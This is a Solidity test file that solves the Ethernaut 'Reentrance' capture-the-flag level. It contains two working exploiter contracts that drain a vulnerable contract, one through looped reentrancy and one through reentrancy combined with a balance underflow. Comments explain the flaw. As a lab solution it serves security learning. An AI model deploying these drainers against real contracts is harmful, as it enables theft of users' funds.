// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Reentrance.sol";
import "src/levels/ReentranceFactory.sol";

contract TestReentrance is BaseTest {
    Reentrance private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ReentranceFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        uint256 insertCoin = ReentranceFactory(payable(address(levelFactory))).insertCoin();
        levelAddress = payable(this.createLevelInstance{value: insertCoin}(true));
        level = Reentrance(levelAddress);

        // Check that the contract is correctly setup
        assertEq(address(level).balance, insertCoin);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // Reentrance use Solidity <0.8 so is prone to under/overflow errors but
        // this is not a problem because it's also usijng SafeMath

        // The big problem here is that it's handling transfer of ETH via `call`
        // without using any Reentrancy guard or following the "Checks-Effects-Interactions Pattern"
        // which strongly suggest you to update the contract's state BEFORE any external interaction
        // The correct flow should be: check internal state, if everything is ok update the state
        // and only after that make external interactions
        // More info:
        // - https://docs.soliditylang.org/en/v0.8.15/security-considerations.html#use-the-checks-effects-interactions-pattern
        // - https://swcregistry.io/docs/SWC-107
        // - https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html

        // Reentrancy work that you "reenter" the same code but the contract state has not been updated (this is the problem)
        // Each Ethereum block has a maximum size so we need to be sure to not exeed that size or our transaction will fail
        // This is the reason why we need to set a correct value for our donation that will also be the amount that we
        // can withdraw in loop
        // Depending on the user funds we could match the same amount in the balance of the victim contract
        // in this case just to validate the reentrancy we will make a donation of 1/100 of the balance
        // This means that we are going to re-enter 100 time to drain all the funds!

        // Balance of player before
        uint256 playerBalance = player.balance;
        uint256 levelBalance = address(level).balance;

        // Deploy our exploiter contract
        // ExploiterLoop exploiter = new ExploiterLoop(level);

        // start the exploit
        // exploiter.exploit{value: levelBalance / 100}();

        // withdraw all the funds
        // exploiter.withdraw();

        // Exploit by using a mix of reentrancy and underflow
        // Deploy our exploiter contract
        ExploiterUnderflow exploiter = new ExploiterUnderflow(level);
        // start the exploit
        exploiter.exploit{value: 1}();
        // withdraw all the funds
        exploiter.withdraw();

        // check that the victim has no more ether
        assertEq(address(level).balance, 0);

        // check that the player has all the ether present before in the victim contract
        assertEq(player.balance, playerBalance + levelBalance);

        vm.stopPrank();
    }
}

contract ExploiterLoop {
    Reentrance private victim;
    address private owner;

    constructor(Reentrance _victim) public {
        owner = msg.sender;
        victim = _victim;
    }

    function withdraw() external {
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "withdraw failed");
    }

    function exploit() external payable {
        require(msg.value > 0, "donate something!");
        victim.donate{value: msg.value}(address(this));

        // even if we can exploit the reentrancy problem we have to withdraw "just"
        // the amount we have donated because there's a (correct) check on the
        // withdrawable amount that must be `balances[msg.sender] >= _amount`
        // this mean that higher is the amount we have donated
        // faster we can drain the contract
        victim.withdraw(msg.value);
    }

    receive() external payable {
        uint256 victimBalance = address(victim).balance;
        if (victimBalance > 0) {
            // we are withdrawing the same amount that they have sent to us
            // because it's the max amount we can withraw each time
            // to respect the check `balances[msg.sender] >= _amount`

            // If the balance is too much we scale down to the max we can withdraw otherwise
            uint256 withdrawAmount = msg.value;
            if (withdrawAmount > victimBalance) {
                withdrawAmount = victimBalance;
            }
            victim.withdraw(withdrawAmount);
        }
    }
}

contract ExploiterUnderflow {
    Reentrance private victim;
    address private owner;
    uint256 private initialDonation;
    bool private exploited;

    constructor(Reentrance _victim) public {
        owner = msg.sender;
        victim = _victim;
        exploited = false;
    }

    function withdraw() external {
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "withdraw failed");
    }

    function exploit() external payable {
        require(msg.value > 0, "donate something!");
        initialDonation = msg.value;

        // donate 1 wei to ourself
        victim.donate{value: msg.value}(address(this));

        // withdraw 1 way and trigger the re-entrancy exploit
        victim.withdraw(initialDonation);

        // because the victim contract underflowed our balance
        // we are now able to drain the whole balance of the contract
        victim.withdraw(address(victim).balance);
    }

    receive() external payable {
        // We need to re-enter only once
        // By re-entering our new balance will be equal to (2^256)-1
        if (!exploited) {
            exploited = true;

            // re-enter the contract withdrawing another wei
            victim.withdraw(initialDonation);
        }
    }
}
